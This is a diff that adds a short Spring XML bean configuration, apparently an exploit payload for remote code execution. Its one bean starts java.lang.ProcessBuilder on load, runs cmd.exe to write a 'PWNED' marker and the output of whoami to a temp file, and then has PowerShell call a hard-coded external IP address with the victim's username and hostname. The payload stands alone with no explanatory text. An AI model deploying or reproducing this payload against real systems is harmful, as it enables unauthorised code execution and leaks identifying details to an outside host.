@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>cmd.exe</value>
+        <value>/C</value>
+        <value>echo CRID_SPRING_PWNED > %TEMP%\crid_spring.txt & whoami >> %TEMP%\crid_spring.txt & powershell -Command "(New-Object Net.WebClient).DownloadString('http://103.217.247.148/crid_rce_callback.php?t=SPRp' + $P + '&u=' + [Environment]::UserName + '&h=' + [Net.Dns]::GetHostName())" 2>nul</value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
